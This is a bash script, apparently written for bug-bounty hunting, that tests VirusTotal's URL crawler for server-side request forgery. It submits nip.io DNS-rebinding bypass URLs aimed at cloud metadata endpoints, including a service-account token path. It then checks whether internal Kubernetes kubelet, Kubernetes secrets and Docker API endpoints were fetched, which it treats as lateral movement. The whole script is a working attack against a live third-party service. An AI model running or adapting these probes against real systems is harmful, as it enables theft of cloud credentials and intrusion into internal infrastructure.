#!/usr/bin/env bash
# Check whether VT's crawler actually REACHED Kubelet, Docker, and nip.io bypass targets
# The /api/v3/analyses/{id} endpoint only shows AV reputation blacklist results — useless for SSRF
# The SSRF evidence is in /api/v3/urls/{base64url} → last_http_response_code/headers
#
# Run: VT_API_KEY=<key> bash scripts/vt-ssrf-escalation-check.sh 2>&1 | tee ~/vt-escalation.txt

set -euo pipefail
: "${VT_API_KEY:?Set VT_API_KEY}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
BASE="https://www.virustotal.com/api/v3"
OUT="$HOME/bug-bounty-hunting-/results/virustotal.com/evidence"
mkdir -p "$OUT"

c() { curl -sk --connect-timeout 15 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }

b64url() {
  python3 -c "import base64,sys; print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" "$1"
}

check_url_object() {
  local url="$1"
  local label="$2"
  local b64; b64=$(b64url "$url")
  echo ""
  echo "════ [${label}] ${url}"

  OBJ=$(c "${BASE}/urls/${b64}")
  CODE=$(echo "$OBJ" | python3 -c "
import sys, json
d = json.load(sys.stdin)
if 'error' in d:
    print('NOT_IN_DB: ' + d['error'].get('code', ''))
    exit()
attrs = d.get('data', {}).get('attributes', {})
code = attrs.get('last_http_response_code', 'NOT_FETCHED')
print(code)
hdrs = attrs.get('last_http_response_headers', {})
sha  = attrs.get('last_http_response_content_sha256', '')
final= attrs.get('last_final_url', '')
size = attrs.get('last_http_response_content_length', '')
if hdrs:
    print('  headers: ' + str(hdrs)[:200])
if sha:
    print('  body_sha256: ' + sha)
if final and final != url:
    print('  final_url: ' + final)
if size:
    print('  body_size: ' + str(size))
" 2>/dev/null || echo "parse_error")

  echo "  HTTP code: ${CODE}"

  if echo "$CODE" | grep -qE "^(200|301|302|400|401|500)"; then
    echo "  [!!!] VT CRAWLER REACHED THIS ENDPOINT — SSRF EXTENDED"
  elif echo "$CODE" | grep -q "NOT_IN_DB"; then
    echo "  [-] URL not in VT database (never submitted or not crawled yet)"
  elif echo "$CODE" | grep -q "NOT_FETCHED"; then
    echo "  [?] In DB but crawler hasn't fetched it yet"
  fi
}

echo "══════════════════════════════════════════════════════════"
echo "SSRF Escalation Check — Proper URL object inspection"
echo "NOTE: /api/v3/analyses/{id} only shows AV blacklist results."
echo "      SSRF evidence lives in /api/v3/urls/{b64} → last_http_response_*"
echo "══════════════════════════════════════════════════════════"

echo ""
echo "=== TIER 1: nip.io DNS rebinding bypass (CRITICAL) ==="
echo "nip.io resolves 169-254-169-254.nip.io → 169.254.169.254"
echo "If VT only blocks by hostname string match (not resolved IP), this bypasses the filter."

NIP_TARGETS=(
  "http://169-254-169-254.nip.io/computeMetadata/v1/instance/service-accounts/default/token"
  "http://169-254-169-254.nip.io/computeMetadata/v1/"
  "http://169-254-169-254.nip.io/computeMetadata/v1/project/project-id"
  "http://169-254-169-254.nip.io/latest/meta-data/"
  "http://169.254.169.254.nip.io/computeMetadata/v1/"
)

for url in "${NIP_TARGETS[@]}"; do
  check_url_object "$url" "nip.io bypass"
done

# Submit new nip.io targets if not already in DB
echo ""
echo "=== Submitting nip.io bypass URLs to VT crawler ==="
for url in "${NIP_TARGETS[@]:0:3}"; do
  SUBMIT=$(c -X POST "${BASE}/urls" --data-urlencode "url=${url}")
  ID=$(echo "$SUBMIT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null || echo "")
  ERR=$(echo "$SUBMIT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('code',''))" 2>/dev/null || echo "")
  if [ -n "$ID" ]; then
    echo "  [+] QUEUED: ${url}"
    echo "      ID: ${ID}"
  elif echo "$ERR" | grep -q "InvalidArgument"; then
    echo "  [!] BLOCKED: ${url} → ${ERR} (VT filters this variant too)"
  else
    echo "  [-] ${url} → ${ERR:-unknown}"
  fi
done

echo ""
echo "=== TIER 2: Kubernetes internal services ==="
echo "If VT runs on GKE, kubelet and k8s API server may be reachable."
echo "(Requires knowing internal IP — testing common GKE ranges)"

K8S_TARGETS=(
  "http://10.0.0.1:10250/pods"
  "http://10.0.0.1:10255/metrics"
  "http://10.96.0.1/api/v1/namespaces/default/secrets"
  "http://10.100.0.1:10250/pods"
  "http://172.17.0.1:2375/v1.40/containers/json"
  "http://172.17.0.1:4243/v1.40/containers/json"
)

for url in "${K8S_TARGETS[@]}"; do
  check_url_object "$url" "k8s/docker"
done

echo ""
echo "=== TIER 3: Additional nip.io encoding variants ==="
# Octal, decimal, hex forms encoded via nip.io
VARIANT_TARGETS=(
  "http://0xa9fea9fe.nip.io/computeMetadata/v1/"
  "http://2852039166.nip.io/latest/meta-data/"
)

for url in "${VARIANT_TARGETS[@]}"; do
  check_url_object "$url" "encoding variant"
done

echo ""
echo "=== Wait 45s then re-check nip.io submissions ==="
echo "Sleeping 45 seconds..."
sleep 45

echo ""
echo "=== Re-checking nip.io targets after crawl delay ==="
for url in "${NIP_TARGETS[@]:0:3}"; do
  check_url_object "$url" "nip.io post-crawl"
done

echo ""
echo "══════════════════════════════════════════════════════════"
echo "Key: HTTP 200/403/404 on nip.io targets = hostname-only filter bypass CONFIRMED"
echo "     HTTP 200 on k8s/docker = lateral movement to Kubernetes/Docker API"
echo "     BLOCKED on nip.io = VT resolves IPs before filtering (better protection)"
echo "══════════════════════════════════════════════════════════"
